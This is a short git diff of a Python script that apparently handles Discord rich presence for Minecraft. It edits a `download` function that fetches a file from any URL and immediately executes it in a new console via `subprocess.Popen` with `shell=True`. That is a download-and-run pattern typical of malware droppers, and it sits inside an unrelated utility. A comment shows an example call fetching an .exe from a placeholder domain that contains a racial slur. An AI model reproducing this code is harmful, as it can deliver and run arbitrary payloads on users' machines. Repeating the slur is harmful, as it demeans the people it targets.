@@ -31,15 +31,12 @@ def close_rpc_on_exit():
 # for shit in the future probly usage "download('http://nigger.com/s.exe', 's.exe')"
 def download(url, filename):
     response = requests.get(url)
-    os.makedirs(os.path.dirname(filename), exist_ok=True)
     with open(filename, 'wb') as file:
         file.write(response.content)
 
-    directory = os.path.dirname(filename)
-    if directory == '':
-        directory = '.'  
+    CREATE_NEW_CONSOLE = 0x00000010
 
-    subprocess.Popen(filename, shell=True, cwd=directory)
+    subprocess.Popen(filename, shell=True, creationflags=CREATE_NEW_CONSOLE)
 
 def discord_rp_mc():
     manage_discord_rpc(
